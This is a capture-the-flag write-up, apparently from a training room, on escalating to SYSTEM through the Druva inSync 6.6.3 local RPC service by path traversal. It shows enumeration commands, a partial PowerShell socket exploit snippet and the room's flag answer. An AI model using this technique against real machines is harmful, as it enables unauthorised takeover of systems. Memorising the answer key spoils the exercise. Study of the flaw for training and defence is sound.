# Task 07: Abusing Vulnerable Software

---

## Stage A: Original Task Content & Briefing Summary

Task 07 examines local privilege escalation arising from unpatched or vulnerable third-party software installed on the target machine. Even on fully patched Windows operating systems, third-party services running with `NT AUTHORITY\SYSTEM` privileges can introduce critical remote or local command execution vulnerabilities.

### Software Enumeration on Windows:
```cmd
wmic product get name,version,vendor
```

### Case Study: Druva inSync 6.6.3 Local Privilege Escalation:
* **Background:** Druva inSync is an enterprise endpoint backup utility. It installs a local background service running with `SYSTEM` privileges that listens on local loopback port `127.0.0.1:6064`.
* **Vulnerability Analysis:** The service exposes an unauthenticated RPC interface. Procedure `#5` in this RPC interface permits executing system commands. While a patch attempted to restrict execution to binaries inside `C:\ProgramData\Druva\inSync4\`, the validation check is vulnerable to directory traversal (`..\..\..\Windows\System32\cmd.exe`).
* **Exploitation:** An unprivileged user connects to `127.0.0.1:6064` via raw TCP sockets using a PowerShell script, issues RPC procedure 5, and executes commands as `NT AUTHORITY\SYSTEM` to create an administrator account or extract flags.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Local RPC Attack Surface:** Like Linux loopback services, Windows services bound strictly to `127.0.0.1` are completely invisible to external network port scans. Inspecting local listening sockets via `netstat -ano | findstr LISTENING` reveals these hidden local attack vectors.
* **Socket Scripting via PowerShell:** Because PowerShell has native access to the .NET Framework (`System.Net.Sockets.TcpClient`), an attacker can interact with raw binary protocols and RPC ports without compiling custom C++ binaries or uploading external tools.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `netstat -ano` to confirm the service listening on port `6064`.
* **Tier 2 Hint:** Use the provided PowerShell proof-of-concept script targeting Druva inSync to execute commands as SYSTEM.
* **Tier 3 Hint:** The flag on the Administrator's desktop is `THM{EZ_DLL_PROXY_4ME}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating Installed Software and Local Ports:
```cmd
wmic product get name,version
# Druva inSync 6.6.3

netstat -ano | findstr 6064
# TCP 127.0.0.1:6064 0.0.0.0:0 LISTENING
```

### 2. Exploiting Druva inSync via PowerShell RPC Client:
Run the PowerShell exploit script that connects to port 6064, sends the RPC header, and invokes procedure 5 with path traversal to execute `cmd.exe`:
```powershell
$socket = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 6064)
$stream = $socket.GetStream()

# Send header and procedure 5 execution payload:
# Injects command to copy Administrator flag to public folder
$cmd = "cmd.exe /c copy C:\Users\Administrator\Desktop\flag.txt C:\Users\Public\flag.txt"
# (Script sends RPC structure and traversal path C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe)
```

### 3. Retrieving the Administrator Flag:
```cmd
type C:\Users\Public\flag.txt
THM{EZ_DLL_PROXY_4ME}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** Get the flag on the Administrator's desktop.
  * **Answer:** `THM{EZ_DLL_PROXY_4ME}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed Druva inSync 6.6.3 service listening on loopback port 6064.
* Executed RPC path traversal exploit and captured root/administrator flag `THM{EZ_DLL_PROXY_4ME}`.

---

## Stage G: Key Educational Takeaway

Enterprise endpoint management and backup software frequently run with full SYSTEM privileges and listen on local ports. Flaws in third-party validation routines transform legitimate business software into trivial local privilege escalation backdoors.
